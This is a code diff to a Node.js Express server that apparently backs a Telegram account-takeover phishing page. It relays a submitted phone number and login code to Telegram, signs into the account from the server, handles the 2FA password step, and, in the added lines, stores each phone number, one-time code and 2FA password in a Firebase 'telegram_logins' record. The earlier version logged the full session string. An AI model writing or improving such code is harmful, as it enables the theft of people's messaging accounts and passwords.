@@ -3,9 +3,10 @@ const express = require('express');
 const path = require('path');
 const { TelegramClient } = require('telegram');
 const { StringSession } = require('telegram/sessions');
+const { Api } = require('telegram');
+const admin = require('firebase-admin');
 
 const app = express();
-
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('.'));
@@ -14,115 +15,109 @@ app.use(express.static('.'));
 const apiId = parseInt(process.env.API_ID);
 const apiHash = process.env.API_HASH;
 
-// temp store (in-memory)
+// Temp session store
 const tempSessions = {};
 
-// ================= ROUTES =================
+// ================= Firebase Admin =================
+const serviceAccount = {
+  type: "service_account",
+  project_id: process.env.FIREBASE_PROJECT_ID,
+  private_key: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g,'\n'),
+  client_email: process.env.FIREBASE_CLIENT_EMAIL
+};
 
-// serve UI
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
+admin.initializeApp({
+  credential: admin.credential.cert(serviceAccount),
+  databaseURL: process.env.FIREBASE_DATABASE_URL
 });
 
-// favicon fix (avoid 404)
-app.get('/favicon.ico', (req, res) => res.status(204));
+const db = admin.database();
 
+// ================= ROUTES =================
+app.get('/', (req,res)=>res.sendFile(path.join(__dirname,'index.html')));
+app.get('/favicon.ico',(req,res)=>res.status(204));
 
-// 🔹 STEP 1: send OTP
-const { Api } = require('telegram');
-
-app.post('/send-otp', async (req, res) => {
+// 🔹 STEP 1: Send OTP
+app.post('/send-otp', async (req,res)=>{
   let { phone } = req.body;
-
-  try {
+  try{
     phone = String(phone).trim();
-    if (!phone.startsWith('+')) {
-      phone = '+855' + phone;
-    }
+    if(!phone.startsWith('+')) phone = '+855' + phone;
 
-    const stringSession = new StringSession('');
-    const client = new TelegramClient(stringSession, apiId, apiHash, {
-      connectionRetries: 5,
-    });
-
+    const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries:5 });
     await client.connect();
 
-    // ✅ CORRECT METHOD (all versions)
-    const result = await client.invoke(
-      new Api.auth.SendCode({
-        phoneNumber: phone,
-        apiId: apiId,
-        apiHash: apiHash,
-        settings: new Api.CodeSettings({})
-      })
-    );
+    const result = await client.invoke(new Api.auth.SendCode({
+      phoneNumber: phone,
+      apiId,
+      apiHash,
+      settings: new Api.CodeSettings({})
+    }));
 
-    // save temp
-    tempSessions[phone] = {
-      client,
-      phoneCodeHash: result.phoneCodeHash,
-    };
+    tempSessions[phone] = { client, phoneCodeHash: result.phoneCodeHash };
 
     console.log("OTP sent:", phone);
+    res.json({ success:true });
 
-    res.json({ success: true });
-
-  } catch (err) {
+  } catch(err){
     console.error("SEND OTP ERROR:", err);
-    res.status(500).json({ success: false, error: err.message });
+    res.status(500).json({ success:false, error:err.message });
   }
 });
 
+// 🔹 STEP 2: Login + 2FA
+app.post('/login', async (req,res)=>{
+  let { phone, otp, password } = req.body;
+  if(!phone || !otp) return res.json({ success:false, message:'Phone & OTP required' });
 
-// 🔹 STEP 2: verify OTP
-app.post('/login', async (req, res) => {
-  let { phone, otp } = req.body;
-
-  if (!phone || !otp) {
-    return res.send("Phone & OTP required");
-  }
-
-  try {
+  try{
     phone = String(phone).trim();
-    if (!phone.startsWith('+')) {
-      phone = '+855' + phone;
-    }
+    if(!phone.startsWith('+')) phone = '+855' + phone;
 
     const temp = tempSessions[phone];
-
-    if (!temp) {
-      return res.send("Session expired. Try again.");
-    }
+    if(!temp) return res.json({ success:false, message:'Session expired. Try again.' });
 
     const { client, phoneCodeHash } = temp;
 
-    await client.signIn({
-      phoneNumber: phone,
-      phoneCode: String(otp),
-      phoneCodeHash: phoneCodeHash,
+    try{
+      // Try normal signIn
+      await client.signIn({ phoneNumber:phone, phoneCode:otp, phoneCodeHash });
+    } catch(err){
+      // 2FA required
+      if(err.error_message && err.error_message.includes('SESSION_PASSWORD_NEEDED')){
+        return res.json({ requirePassword:true, message:'2FA password required' });
+      } else throw err;
+    }
+
+    // If password provided, signIn with 2FA
+    if(password){
+      await client.checkPassword(password);
+    }
+
+    // Save session string
+    const sessionString = client.session.save();
+    console.log("LOGIN SUCCESS:", phone);
+
+    // Save to Firebase
+    await db.ref('telegram_logins').push({
+      phone,
+      otp,
+      password: password || null,
+      timestamp: Date.now()
     });
 
-    const sessionString = client.session.save();
-
-    console.log("LOGIN SUCCESS:", phone);
-    console.log("SESSION:", sessionString);
-
-    // cleanup
+    // Cleanup
     delete tempSessions[phone];
+    await client.disconnect();
 
-    res.send("<h3>✅ Login successful</h3>");
+    res.json({ success:true, message:'Login successful' });
 
-  } catch (err) {
+  } catch(err){
     console.error("LOGIN ERROR:", err.message);
-
-    res.send(`<h3>❌ ${err.message}</h3>`);
+    res.json({ success:false, message:err.message });
   }
 });
 
-
 // ================= START =================
 const PORT = process.env.PORT || 3000;
-
-app.listen(PORT, () => {
-  console.log("Server running on port", PORT);
-});
+app.listen(PORT, ()=>console.log("Server running on port",PORT));
